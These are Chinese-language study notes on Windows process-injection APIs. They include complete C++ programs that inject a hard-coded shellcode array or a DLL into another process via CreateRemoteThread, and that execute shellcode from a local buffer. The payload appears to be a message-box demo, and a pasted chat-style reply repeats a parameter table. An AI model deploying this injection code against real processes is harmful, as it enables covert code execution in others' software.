# Windows API 函数用法与注入实践整理文档

## 📁 目录

1. [OpenProcess](#1-openprocess)
2. [CreateProcess](#2-createprocess)
3. [VirtualAllocEx](#3-virtualallocex)
4. [WriteProcessMemory](#4-writeprocessmemory)
5. [CreateRemoteThread](#5-createremotethread)
6. [VirtualProtectEx](#6-virtualprotectex)
7. [典型注入流程示意](#7-典型注入流程示意)
8. [绕过 DEP 的说明](#8-绕过-dep-的数据执行保护)

---

## 1. OpenProcess

**作用**：打开指定进程并获取其句柄。

```cpp
HANDLE OpenProcess(
  DWORD dwDesiredAccess,
  BOOL  bInheritHandle,
  DWORD dwProcessId
);
```

### 参数说明：

* `dwDesiredAccess`：请求访问权限，如 `PROCESS_ALL_ACCESS`, `PROCESS_VM_WRITE`, `PROCESS_VM_OPERATION`, `PROCESS_VM_READ`, `PROCESS_CREATE_THREAD` 等。
* `bInheritHandle`：是否可被子进程继承。
* `dwProcessId`：目标进程的 PID。

### 返回值：

成功返回进程句柄，失败返回 NULL，可调用 `GetLastError()` 获取错误码。

### 示例：

```cpp
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 1234); // 打开 PID 为1234的进程
```

---

## 2. CreateProcess

**作用**：创建一个新进程。

```cpp
BOOL CreateProcessW(
  LPCWSTR lpApplicationName,
  LPWSTR lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL bInheritHandles,
  DWORD dwCreationFlags,
  LPVOID lpEnvironment,
  LPCWSTR lpCurrentDirectory,
  LPSTARTUPINFOW lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
```

### 常用参数简化说明：

* `lpApplicationName`: 程序路径（可为 NULL）。
* `lpCommandLine`: 命令行参数。
* `lpProcessAttributes`, `lpThreadAttributes`: 安全属性，通常为 NULL。
* `bInheritHandles`: 是否继承句柄。
* `dwCreationFlags`: 常见有 `CREATE_NEW_CONSOLE`, `CREATE_SUSPENDED`。
* `lpStartupInfo`: 启动信息结构体。
* `lpProcessInformation`: 接收返回的进程和线程句柄信息。

### 示例：

```cpp
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
```

---

## 3. VirtualAllocEx

**作用**：在目标进程中分配内存空间。

```cpp
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flAllocationType,
  DWORD flProtect
);
```

### 参数说明：

* `hProcess`: 目标进程句柄。
* `lpAddress`: 指定地址或为 NULL。
* `dwSize`: 分配大小。
* `flAllocationType`: 一般为 `MEM_COMMIT | MEM_RESERVE`。
* `flProtect`: 内存保护属性，如 `PAGE_EXECUTE_READWRITE`。

### 示例：

```cpp
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
```

---

## 4. WriteProcessMemory

**作用**：将数据写入远程进程内存。

```cpp
BOOL WriteProcessMemory(
  HANDLE hProcess,
  LPVOID lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T nSize,
  SIZE_T *lpNumberOfBytesWritten
);
```

### 参数说明：

* `hProcess`: 目标进程句柄。
* `lpBaseAddress`: 写入的目标地址。
* `lpBuffer`: 本地缓冲区地址。
* `nSize`: 写入字节数。
* `lpNumberOfBytesWritten`: 实际写入字节数。

### 示例：

```cpp
char data[] = "Hello Injected!";
WriteProcessMemory(hProcess, remoteMem, data, sizeof(data), NULL);
```

---

## 5. CreateRemoteThread

**作用**：在目标进程中创建线程。

```cpp
HANDLE CreateRemoteThread(
  HANDLE hProcess,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);
```

### 参数说明：

* `hProcess`: 目标进程句柄。
* `lpStartAddress`: 要执行的远程函数地址。
* `lpParameter`: 传递给函数的参数。
* `dwCreationFlags`: 通常为 0（立即运行）或 `CREATE_SUSPENDED`。
* `lpThreadId`: 可为 NULL。

### 示例：

```cpp
HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteFuncAddr, remoteMem, 0, NULL);
```

---

## 6. VirtualProtectEx

**作用**：修改远程进程某区域内存的保护属性。

```cpp
BOOL VirtualProtectEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD flNewProtect,
  PDWORD lpflOldProtect
);
```

### 参数说明：

* `hProcess`: 进程句柄。
* `lpAddress`: 内存地址。
* `dwSize`: 修改大小。
* `flNewProtect`: 新的内存保护属性。
* `lpflOldProtect`: 保存旧保护属性。

### 示例：

```cpp
DWORD oldProtect;
VirtualProtectEx(hProcess, remoteMem, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);
```

---

## 7. 典型注入流程示意

1. 获取目标进程 PID。
2. 使用 `OpenProcess` 打开目标进程。
3. 使用 `VirtualAllocEx` 在目标进程中分配内存。
4. 使用 `WriteProcessMemory` 写入 DLL 路径或 Shellcode。
5. 使用 `GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")` 获取函数地址（如果是 DLL 注入）。
6. 使用 `CreateRemoteThread` 启动远程线程执行 LoadLibraryA 或 Shellcode。
7. 可选：使用 `VirtualProtectEx` 修改内存属性以执行代码。

---

## 8. 绕过 DEP 的数据执行保护

Windows 的 DEP (Data Execution Prevention) 不允许执行非代码段内存。
为绕过：

* 分配内存时使用 `PAGE_EXECUTE_READWRITE`。
* 或者使用 `VirtualProtectEx` 修改内存属性。

### 示例流程：

```cpp
// 分配可执行内存
LPVOID shellcodeMem = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// 写入 Shellcode
WriteProcessMemory(hProcess, shellcodeMem, shellcode, shellcodeSize, NULL);

// 修改内存保护属性为可执行
DWORD oldProtect;
VirtualProtectEx(hProcess, shellcodeMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);

// 创建远程线程执行 shellcode
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeMem, NULL, 0, NULL);
```

---

# 创建进程

```cpp
// 创建进程.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

int main()
{

    STARTUPINFO si2{};
    si2.cb = sizeof(si2);
    PROCESS_INFORMATION pi2{};
    WCHAR app[] = L"C:\\Windows\\System32\\notepad.exe";//
    std::cout << CreateProcessW(app, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si2, &pi2) << std::endl;
    std::cout << GetLastError() << std::endl;
    WaitForSingleObject(pi2.hProcess, INFINITE);

    STARTUPINFO si{};//不一定要设置si.cb为结构大小， 这个大小会影响窗口标题，重定向之类的效果
    PROCESS_INFORMATION pi;
    //si.lpTitle = (LPWSTR)L"标题";


    ZeroMemory(&pi, sizeof(pi));
    WCHAR cmd[] = L"CMD.EXE";
    std::cout << CreateProcessW(
        NULL,
        cmd,
        NULL,
        NULL,
        FALSE,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &si,
        &pi
    ) << std::endl;
    WaitForSingleObject(pi.hProcess, INFINITE);
    std::cout << GetLastError() << std::endl;
}
```



# 注入进程并执行SHELLCODE

```cpp
// 进程注入.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

int main()
{
    unsigned char data[] = {
    0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
    0x48, 0x83, 0xEC, 0x78, 0x45, 0x33, 0xC0, 0xC7, 0x45, 0xB0, 0x55, 0x53, 0x45, 0x52, 0x44, 0x88,
    0x45, 0xBA, 0xC7, 0x45, 0xB4, 0x33, 0x32, 0x2E, 0x44, 0x66, 0xC7, 0x45, 0xB8, 0x4C, 0x4C, 0xC7,
    0x45, 0xC0, 0x4D, 0x65, 0x73, 0x73, 0xC7, 0x45, 0xC4, 0x61, 0x67, 0x65, 0x42, 0xC7, 0x45, 0xC8,
    0x6F, 0x78, 0x41, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xD0,
    0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xD4, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD8, 0x61, 0x72,
    0x79, 0x41, 0x4C, 0x8B, 0x78, 0x18, 0x49, 0x83, 0xC7, 0x20, 0x44, 0x88, 0x45, 0xDC, 0xC7, 0x45,
    0xE0, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xE4, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xE8, 0x64,
    0x64, 0x72, 0x65, 0x4D, 0x8B, 0x77, 0x08, 0x66, 0xC7, 0x45, 0xEC, 0x73, 0x73, 0x44, 0x88, 0x45,
    0xEE, 0x4C, 0x89, 0x45, 0x60, 0x4C, 0x89, 0x45, 0x58, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x76, 0x20, 0x48, 0x63, 0x46, 0x3C, 0x48, 0x8B, 0x84, 0x30, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0xC8, 0x48, 0xC1, 0xE9, 0x20, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x44,
    0x89, 0x45, 0x48, 0x8B, 0x44, 0x31, 0x18, 0x89, 0x45, 0x50, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0x00,
    0x00, 0x00, 0x44, 0x8B, 0x64, 0x31, 0x24, 0x8B, 0x54, 0x31, 0x1C, 0x4C, 0x03, 0xE6, 0x44, 0x8B,
    0x6C, 0x31, 0x20, 0x4C, 0x03, 0xEE, 0x48, 0x89, 0x55, 0xA8, 0x41, 0x0F, 0xB7, 0x04, 0x24, 0x41,
    0x8B, 0x5D, 0x00, 0x48, 0x03, 0xDE, 0x48, 0x8D, 0x0C, 0x82, 0x48, 0x8B, 0xD3, 0x8B, 0x3C, 0x31,
    0x48, 0x8D, 0x4D, 0xD0, 0x48, 0x03, 0xFE, 0xE8, 0x90, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x48, 0x8B,
    0xCF, 0x48, 0x8B, 0xD3, 0x48, 0x0F, 0x44, 0x4D, 0x58, 0x48, 0x89, 0x4D, 0x58, 0x48, 0x8D, 0x4D,
    0xE0, 0xE8, 0x76, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0x7D, 0x60,
    0x48, 0x8B, 0xDF, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x85, 0xFF, 0x74, 0x09, 0x48, 0x8B, 0x55, 0x58,
    0x48, 0x85, 0xD2, 0x75, 0x28, 0x8B, 0x45, 0x48, 0x49, 0x83, 0xC5, 0x04, 0x48, 0x8B, 0x55, 0xA8,
    0xFF, 0xC0, 0x49, 0x83, 0xC4, 0x02, 0x89, 0x45, 0x48, 0x3B, 0x45, 0x50, 0x72, 0x8C, 0x4D, 0x8B,
    0x76, 0x08, 0x4D, 0x3B, 0xF7, 0x0F, 0x85, 0x33, 0xFF, 0xFF, 0xFF, 0xEB, 0x1B, 0x48, 0x8D, 0x4D,
    0xB0, 0xFF, 0xD2, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8B, 0xC8, 0xFF, 0xD3, 0x45, 0x33, 0xC9, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F,
    0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0x44, 0x8A, 0x01, 0x33,
    0xC0, 0x4C, 0x8B, 0xDA, 0x44, 0x8B, 0xD0, 0x45, 0x84, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0xC9, 0x49,
    0xFF, 0xC1, 0x41, 0xFF, 0xC2, 0x41, 0x38, 0x01, 0x75, 0xF5, 0x44, 0x8B, 0xC8, 0xEB, 0x06, 0x41,
    0xFF, 0xC1, 0x48, 0xFF, 0xC2, 0x38, 0x02, 0x75, 0xF6, 0x45, 0x3B, 0xD1, 0x75, 0x23, 0x8B, 0xD0,
    0x45, 0x84, 0xC0, 0x74, 0x16, 0x4C, 0x2B, 0xD9, 0x46, 0x3A, 0x04, 0x19, 0x75, 0x0D, 0x48, 0xFF,
    0xC1, 0xFF, 0xC2, 0x44, 0x8A, 0x01, 0x45, 0x84, 0xC0, 0x75, 0xED, 0x41, 0x3B, 0xD2, 0x0F, 0x94,
    0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    DWORD pid = 3008;  // 目标进程 PID，替换为真实 PID

    // 打开目标进程，申请读写和操作内存权限
    HANDLE hProcess = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD,
        FALSE,
        pid
    );

    if (hProcess == NULL) {
        printf("打开进程失败，错误码: %lu\n", GetLastError());
        return 1;
    }

    printf("成功打开进程，句柄: %p\n", hProcess);

    //在进程中执行代码
    SIZE_T write_bytes;
    LPVOID imagebase = VirtualAllocEx(hProcess, NULL, sizeof(data),MEM_COMMIT ,PAGE_EXECUTE_READWRITE);//在目标中申请内存
    WriteProcessMemory(hProcess,imagebase,data,sizeof(data), &write_bytes);//把数据写进目标内存
    CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)(imagebase), NULL, 0, NULL);//在目标内存中执行线程

    // 用完要关闭句柄
    CloseHandle(hProcess);
    return 0;
}
```

# 向进程中写入字符串数据， 并把字符串数据当成参数调用

```cpp
#include <Windows.h>
#include <iostream>

bool InjectDLL(DWORD pid)
{
    const char* dllPath = "C:\\Path\\To\\injectdll.dll";  // 这里写死DLL路径

    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (!hProcess)
    {
        std::cerr << "打开进程失败，错误码: " << GetLastError() << std::endl;
        return false;
    }

    size_t pathLen = strlen(dllPath) + 1;
    LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, pathLen, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!remoteMem)
    {
        std::cerr << "分配内存失败，错误码: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return false;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMem, dllPath, pathLen, &bytesWritten) || bytesWritten != pathLen)
    {
        std::cerr << "写入内存失败，错误码: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    LPVOID loadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (!loadLibAddr)
    {
        std::cerr << "获取 LoadLibraryA 地址失败" << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
    //remoteMem为写到目录里的字符串，当成参数调用
    //(LPTHREAD_START_ROUTINE)loadLibAddr,  // 线程入口，LoadLibraryA函数地址
    //remoteMem,                            // 传给LoadLibraryA的参数（DLL路径字符串地址）
    if (!hThread)
    {
        std::cerr << "创建远程线程失败，错误码: " << GetLastError() << std::endl;
        VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }

    WaitForSingleObject(hThread, INFINITE);

    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    std::cout << "注入成功！" << std::endl;
    return true;
}

int main()
{
    DWORD pid;
    std::cout << "请输入目标进程 PID: ";
    std::cin >> pid;

    if (!InjectDLL(pid))
    {
        std::cerr << "注入失败！" << std::endl;
        return 1;
    }
    return 0;
}
```

```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess,               // 目标进程句柄
    NULL,                   // 默认安全属性
    0,                      // 默认堆栈大小
    (LPTHREAD_START_ROUTINE)loadLibAddr, // 线程起始地址（函数指针，例如 LoadLibraryA 的地址）
    remoteMem,              // 线程参数（传给线程函数的参数，通常是一个字符串地址）
    0,                      // 默认创建标志（立即执行）
    NULL                    // 不关心线程 ID
);
```

| 参数                                    | 说明                                                                  |
| ------------------------------------- | ------------------------------------------------------------------- |
| `hProcess`                            | 目标进程的句柄，通常通过 `OpenProcess(PROCESS_ALL_ACCESS, ...)` 获取。             |
| `NULL`                                | 安全属性，一般为 `NULL` 表示默认。                                               |
| `0`                                   | 线程的堆栈大小，`0` 表示使用默认大小。                                               |
| `(LPTHREAD_START_ROUTINE)loadLibAddr` | 要在目标进程中执行的函数地址，通常是 `LoadLibraryA` 的地址。需要使用 `GetProcAddress` 获取后再传入。 |
| `remoteMem`                           | 函数的参数，在这里是远程进程内存地址，里面写入的是 DLL 路径的字符串。例如写入 `"C:\\MyDll.dll"`。        |
| `0`                                   | 线程创建标志，`0` 表示线程创建后立即运行。                                             |
| `NULL`                                | 如果你不关心线程 ID，可以设置为 NULL。                                             |

是的，你的解释 **基本是对的**，不过我来帮你更准确地解释每个部分：

---

### ✅ 代码：

```cpp
HANDLE hThread = CreateRemoteThread(
    hProcess,               // 目标进程句柄
    NULL,                   // 默认安全属性
    0,                      // 默认堆栈大小
    (LPTHREAD_START_ROUTINE)loadLibAddr, // 线程起始地址（函数指针，例如 LoadLibraryA 的地址）
    remoteMem,              // 线程参数（传给线程函数的参数，通常是一个字符串地址）
    0,                      // 默认创建标志（立即执行）
    NULL                    // 不关心线程 ID
);
```

---

### ✅ 参数解释：

| 参数                                    | 说明                                                                  |
| ------------------------------------- | ------------------------------------------------------------------- |
| `hProcess`                            | 目标进程的句柄，通常通过 `OpenProcess(PROCESS_ALL_ACCESS, ...)` 获取。             |
| `NULL`                                | 安全属性，一般为 `NULL` 表示默认。                                               |
| `0`                                   | 线程的堆栈大小，`0` 表示使用默认大小。                                               |
| `(LPTHREAD_START_ROUTINE)loadLibAddr` | 要在目标进程中执行的函数地址，通常是 `LoadLibraryA` 的地址。需要使用 `GetProcAddress` 获取后再传入。 |
| `remoteMem`                           | 函数的参数，在这里是远程进程内存地址，里面写入的是 DLL 路径的字符串。例如写入 `"C:\\MyDll.dll"`。        |
| `0`                                   | 线程创建标志，`0` 表示线程创建后立即运行。                                             |
| `NULL`                                | 如果你不关心线程 ID，可以设置为 NULL。                                             |

---

### ✅ 注入流程简要说明（你这句代码处于整个流程的中间）：

1. 使用 `OpenProcess` 获取目标进程句柄。
2. 使用 `VirtualAllocEx` 为 DLL 路径在目标进程中分配内存。
3. 使用 `WriteProcessMemory` 把 DLL 路径字符串写入上面的内存。
4. 使用 `GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA")` 获取 `LoadLibraryA` 地址。
5. 使用 `CreateRemoteThread` 创建远程线程，执行 `LoadLibraryA(remoteMem)`，加载 DLL。

---

### ✅ 示例图解：

```cpp
// 步骤 1: 打开目标进程
HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPid);

// 步骤 2: 分配远程内存
LPVOID remoteMem = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);

// 步骤 3: 写入 DLL 路径到远程进程
WriteProcessMemory(hProcess, remoteMem, dllPath, strlen(dllPath) + 1, NULL);

// 步骤 4: 获取 LoadLibraryA 的地址
LPVOID loadLibAddr = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

// 步骤 5: 创建远程线程
CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibAddr, remoteMem, 0, NULL);
```

# 直接修改原数组地址执行代码

```cpp
// 修改内存页为可执行-在数组指针上执行SHELLCODE.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>

int main()
{
    unsigned char data[] = {
    0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8B, 0xEC,
    0x48, 0x83, 0xEC, 0x78, 0x45, 0x33, 0xC0, 0xC7, 0x45, 0xB0, 0x55, 0x53, 0x45, 0x52, 0x44, 0x88,
    0x45, 0xBA, 0xC7, 0x45, 0xB4, 0x33, 0x32, 0x2E, 0x44, 0x66, 0xC7, 0x45, 0xB8, 0x4C, 0x4C, 0xC7,
    0x45, 0xC0, 0x4D, 0x65, 0x73, 0x73, 0xC7, 0x45, 0xC4, 0x61, 0x67, 0x65, 0x42, 0xC7, 0x45, 0xC8,
    0x6F, 0x78, 0x41, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xD0,
    0x4C, 0x6F, 0x61, 0x64, 0xC7, 0x45, 0xD4, 0x4C, 0x69, 0x62, 0x72, 0xC7, 0x45, 0xD8, 0x61, 0x72,
    0x79, 0x41, 0x4C, 0x8B, 0x78, 0x18, 0x49, 0x83, 0xC7, 0x20, 0x44, 0x88, 0x45, 0xDC, 0xC7, 0x45,
    0xE0, 0x47, 0x65, 0x74, 0x50, 0xC7, 0x45, 0xE4, 0x72, 0x6F, 0x63, 0x41, 0xC7, 0x45, 0xE8, 0x64,
    0x64, 0x72, 0x65, 0x4D, 0x8B, 0x77, 0x08, 0x66, 0xC7, 0x45, 0xEC, 0x73, 0x73, 0x44, 0x88, 0x45,
    0xEE, 0x4C, 0x89, 0x45, 0x60, 0x4C, 0x89, 0x45, 0x58, 0xE9, 0xC4, 0x00, 0x00, 0x00, 0x49, 0x8B,
    0x76, 0x20, 0x48, 0x63, 0x46, 0x3C, 0x48, 0x8B, 0x84, 0x30, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B,
    0xC8, 0x48, 0xC1, 0xE9, 0x20, 0x85, 0xC9, 0x0F, 0x84, 0xA1, 0x00, 0x00, 0x00, 0x8B, 0xC8, 0x44,
    0x89, 0x45, 0x48, 0x8B, 0x44, 0x31, 0x18, 0x89, 0x45, 0x50, 0x85, 0xC0, 0x0F, 0x84, 0x8C, 0x00,
    0x00, 0x00, 0x44, 0x8B, 0x64, 0x31, 0x24, 0x8B, 0x54, 0x31, 0x1C, 0x4C, 0x03, 0xE6, 0x44, 0x8B,
    0x6C, 0x31, 0x20, 0x4C, 0x03, 0xEE, 0x48, 0x89, 0x55, 0xA8, 0x41, 0x0F, 0xB7, 0x04, 0x24, 0x41,
    0x8B, 0x5D, 0x00, 0x48, 0x03, 0xDE, 0x48, 0x8D, 0x0C, 0x82, 0x48, 0x8B, 0xD3, 0x8B, 0x3C, 0x31,
    0x48, 0x8D, 0x4D, 0xD0, 0x48, 0x03, 0xFE, 0xE8, 0x90, 0x00, 0x00, 0x00, 0x85, 0xC0, 0x48, 0x8B,
    0xCF, 0x48, 0x8B, 0xD3, 0x48, 0x0F, 0x44, 0x4D, 0x58, 0x48, 0x89, 0x4D, 0x58, 0x48, 0x8D, 0x4D,
    0xE0, 0xE8, 0x76, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC0, 0x85, 0xC0, 0x48, 0x0F, 0x44, 0x7D, 0x60,
    0x48, 0x8B, 0xDF, 0x48, 0x89, 0x5D, 0x60, 0x48, 0x85, 0xFF, 0x74, 0x09, 0x48, 0x8B, 0x55, 0x58,
    0x48, 0x85, 0xD2, 0x75, 0x28, 0x8B, 0x45, 0x48, 0x49, 0x83, 0xC5, 0x04, 0x48, 0x8B, 0x55, 0xA8,
    0xFF, 0xC0, 0x49, 0x83, 0xC4, 0x02, 0x89, 0x45, 0x48, 0x3B, 0x45, 0x50, 0x72, 0x8C, 0x4D, 0x8B,
    0x76, 0x08, 0x4D, 0x3B, 0xF7, 0x0F, 0x85, 0x33, 0xFF, 0xFF, 0xFF, 0xEB, 0x1B, 0x48, 0x8D, 0x4D,
    0xB0, 0xFF, 0xD2, 0x48, 0x8D, 0x55, 0xC0, 0x48, 0x8B, 0xC8, 0xFF, 0xD3, 0x45, 0x33, 0xC9, 0x45,
    0x33, 0xC0, 0x33, 0xD2, 0x33, 0xC9, 0xFF, 0xD0, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x78, 0x41, 0x5F,
    0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0x44, 0x8A, 0x01, 0x33,
    0xC0, 0x4C, 0x8B, 0xDA, 0x44, 0x8B, 0xD0, 0x45, 0x84, 0xC0, 0x74, 0x0E, 0x4C, 0x8B, 0xC9, 0x49,
    0xFF, 0xC1, 0x41, 0xFF, 0xC2, 0x41, 0x38, 0x01, 0x75, 0xF5, 0x44, 0x8B, 0xC8, 0xEB, 0x06, 0x41,
    0xFF, 0xC1, 0x48, 0xFF, 0xC2, 0x38, 0x02, 0x75, 0xF6, 0x45, 0x3B, 0xD1, 0x75, 0x23, 0x8B, 0xD0,
    0x45, 0x84, 0xC0, 0x74, 0x16, 0x4C, 0x2B, 0xD9, 0x46, 0x3A, 0x04, 0x19, 0x75, 0x0D, 0x48, 0xFF,
    0xC1, 0xFF, 0xC2, 0x44, 0x8A, 0x01, 0x45, 0x84, 0xC0, 0x75, 0xED, 0x41, 0x3B, 0xD2, 0x0F, 0x94,
    0xC0, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };

    DWORD old;
    VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, &old);
    void* t = reinterpret_cast<void*>(data);
    ((void(*)())  t)();
}
```